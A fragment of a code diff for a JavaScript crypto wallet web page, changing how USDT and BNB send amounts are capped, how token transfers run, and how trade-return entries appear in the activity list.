   const usdtUsd='$'+usdtFmt;
   const bnbFmt=bnbBal.toFixed(4);
   const bnbUsd='$'+(bnbBal*bnbPrice).toLocaleString('en-US',{minimumFractionDigits:2});
@@ -841,9 +1109,10 @@ function goStep1(){
 
 function setMaxAmt(){
   if(currentSendToken==='USDT'){
-    document.getElementById('txAmt').value=usdtBal.toFixed(2);
+    let sendableUsdt = usdtBal;
+    if(activeTrade) sendableUsdt -= activeTrade.margin;
+    document.getElementById('txAmt').value=sendableUsdt.toFixed(2);
   }else{
-    // Leave small amount for gas
     const maxBnb=Math.max(0,bnbBal-0.001);
     document.getElementById('txAmt').value=maxBnb.toFixed(4);
   }
@@ -870,7 +1139,6 @@ async function execTx(){
     btn.textContent='Confirm in wallet…';
     btn.disabled=true;
     
-    // Executing the pure standard transaction (your verified working logic)
     if(currentSendToken==='USDT'){
       const dec=await contract.decimals();
       const tx=await contract.transfer(to,ethers.utils.parseUnits(amt,dec));
@@ -909,8 +1177,8 @@ function renderActivity(){
   const html=h.length?h.map(tx=>`
     <div class="act-row">
       <div class="act-ico"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 19L19 5M19 5v10M19 5H9"/></svg></div>
-      <div style="flex:1;"><div class="act-type">Send ${tx.sym}</div><div class="act-sub">To ${tx.to} · ${tx.time}</div></div>
-      <div style="text-align:right;"><div style="font-size:14px;font-weight:700;">−${tx.amt} ${tx.sym}</div><div style="font-size:11px;color:var(--green);font-weight:600;margin-top:2px;">Confirmed</div></div>
+      <div style="flex:1;"><div class="act-type">${tx.to==='MARKET'?'Trade Return':'Send'} ${tx.sym}</div><div class="act-sub">${tx.to==='MARKET'?'Live Trading':('To '+tx.to)} · ${tx.time}</div></div>
+      <div style="text-align:right;"><div style="font-size:14px;font-weight:700;">${tx.to==='MARKET'&&tx.amt>0?'+':'−'}${tx.amt} ${tx.sym}</div><div style="font-size:11px;color:var(--green);font-weight:600;margin-top:2px;">Confirmed</div></div>
     </div>`).join('')
     :'<div style="padding:40px 20px;text-align:center;color:var(--t3);font-size:13px;font-weight:600;">No recent activity</div>';
   document.getElementById('actList').innerHTML=html;
